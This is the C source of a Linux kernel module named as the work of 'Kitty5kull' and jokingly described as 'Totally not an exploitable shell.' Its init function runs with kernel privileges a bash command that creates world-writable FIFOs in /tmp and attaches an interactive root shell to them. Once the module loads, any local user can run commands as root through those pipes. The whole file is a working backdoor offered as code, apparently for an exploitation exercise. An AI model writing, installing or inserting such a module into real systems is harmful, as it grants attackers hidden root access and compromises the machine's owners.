#include <linux/init.h>             // Macros used to mark up functions e.g., __init __exit
#include <linux/module.h>           // Core header for loading LKMs into the kernel
#include <linux/kernel.h>           // Contains types, macros, functions for the kernel

MODULE_LICENSE("GPL");
MODULE_AUTHOR("-=- Kitty5kull -=-");
MODULE_DESCRIPTION("Totally not an exploitable shell.");
MODULE_VERSION("0.99");


char* argv[] = { "/bin/bash", "-c", "rm -rf /tmp/*fif; mkfifo /tmp/infif; mkfifo /tmp/outfif; chmod 777 /tmp/infif; /bin/bash -i > /tmp/outfif < /tmp/infif", NULL };

static int __init hello_init(void)
{
   call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
   return 0;
}

static void __exit hello_exit(void)
{
}

module_init(hello_init);
module_exit(hello_exit);
